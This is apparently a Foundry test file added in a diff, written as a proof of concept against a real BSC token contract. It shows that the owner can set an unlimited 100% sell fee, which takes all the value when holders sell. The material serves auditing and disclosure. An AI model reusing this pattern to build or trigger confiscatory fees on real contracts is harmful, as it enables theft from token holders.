@@ -1,0 +1,151 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for BrawlStarsToken
+interface IBrawlStarsToken {
+    function owner() external view returns (address);
+    function uniswapV2Router() external view returns (address);
+    function uniswapV2Pair() external view returns (address);
+    function operationFee() external view returns (uint256);
+    function mktFee() external view returns (uint256);
+    function p2eFee() external view returns (uint256);
+    function feeEnabled() external view returns (bool);
+    function setOperationFee(uint256 _fee) external;
+    function setMktAddress(address _mkt, uint256 fee) external;
+    function setP2eAddress(address _p2e, uint256 fee) external;
+    function excludeFee(address) external view returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function totalSupply() external view returns (uint256);
+}
+
+// Minimal interface for PancakeSwap Router
+interface IPancakeRouter {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
+contract ExploitTest is Test {
+    // Deployed contract address (BSC)
+    address constant TARGET = 0xdde57967990daf1f47296000505e4364f236805e;
+    // PancakeSwap Router v2 on BSC
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    // WBNB on BSC
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+    IBrawlStarsToken public token;
+    IPancakeRouter public router;
+    address public owner;
+    address public attacker;
+    address public pair;
+
+    function setUp() public {
+        token = IBrawlStarsToken(TARGET);
+        router = IPancakeRouter(ROUTER);
+        owner = token.owner();
+        attacker = makeAddr("attacker");
+        pair = token.uniswapV2Pair();
+
+        // Label for readability
+        vm.label(TARGET, "BrawlStarsToken");
+        vm.label(owner, "Owner");
+        vm.label(attacker, "Attacker");
+        vm.label(ROUTER, "Router");
+        vm.label(pair, "Pair");
+    }
+
+    function testUnlimitedOperationFee() public {
+        // Step 1: Check that owner can set operationFee to any value (we set to 100%)
+        vm.startPrank(owner);
+        token.setOperationFee(100); // 100% fee
+        token.setMktAddress(address(0), 0); // set mktFee to 0
+        token.setP2eAddress(address(0), 0); // set p2eFee to 0
+        vm.stopPrank();
+
+        // Ensure feeEnabled is true (default)
+        assertTrue(token.feeEnabled());
+
+        // Step 2: Provide liquidity to the pair so that swaps work.
+        // Owner must have some tokens and BNB.
+        uint256 initialOwnerTokenBal = token.balanceOf(owner);
+        assertGt(initialOwnerTokenBal, 0, "Owner has no tokens");
+
+        vm.deal(owner, 100 ether);
+        vm.startPrank(owner);
+        token.approve(ROUTER, type(uint256).max);
+        router.addLiquidityETH{value: 50 ether}(
+            TARGET,
+            initialOwnerTokenBal / 2,
+            0,
+            0,
+            owner,
+            block.timestamp + 1 hours
+        );
+        vm.stopPrank();
+
+        // Step 3: Transfer some tokens to attacker so they can sell
+        uint256 amountForAttacker = 10_000 * 1e18; // 10,000 tokens
+        vm.prank(owner);
+        token.transfer(attacker, amountForAttacker);
+
+        assertEq(token.balanceOf(attacker), amountForAttacker, "Attacker token balance mismatch");
+
+        // Step 4: Attacker sells tokens to the pair
+        uint256 initialOwnerETH = owner.balance;
+        uint256 initialAttackerETH = attacker.balance;
+
+        vm.startPrank(attacker);
+        token.approve(ROUTER, amountForAttacker);
+        address[] memory path = new address[](2);
+        path[0] = TARGET;
+        path[1] = WBNB;
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            amountForAttacker,
+            0,
+            path,
+            attacker,
+            block.timestamp + 1 hours
+        );
+        vm.stopPrank();
+
+        // Step 5: After swap, attacker should have received almost no ETH (since 100% fee)
+        uint256 attackerETHReceived = attacker.balance - initialAttackerETH;
+        // The swap refunds the net amount after fees; due to 100% operationFee, almost all tokens are taken as fee.
+        // The fee gets swapped to ETH and sent to owner (via the internal swapTokensForEthAndSend).
+        // The effective amount swapped for attacker is zero, so attacker should get negligible ETH.
+        // We assert that attacker received less than 1% of what would be expected without fee.
+        // Without fee, the output would be roughly (amountForAttacker * wethReserve / tokenReserve) but we can't compute exactly.
+        // We simply check that the owner's ETH increased substantially.
+        uint256 ownerETHIncrease = owner.balance - initialOwnerETH;
+        // Since 100% fee, all token value should go to owner (after swapping the fee to ETH).
+        // Check that owner's ETH increased significantly.
+        assertGt(ownerETHIncrease, 0.1 ether, "Owner should have received significant ETH from the fee");
+        // Also check that attacker's ETH gain is very small (likely less than 0.01 ETH)
+        assertLt(attackerETHReceived, 0.01 ether, "Attacker should not have gained much ETH due to 100% fee");
+
+        // Step 6: Additionally, we can verify that the operationFee was indeed set to 100
+        uint256 operationFee = token.operationFee();
+        assertEq(operationFee, 100, "Operation fee not set to 100");
+    }
+}
+```
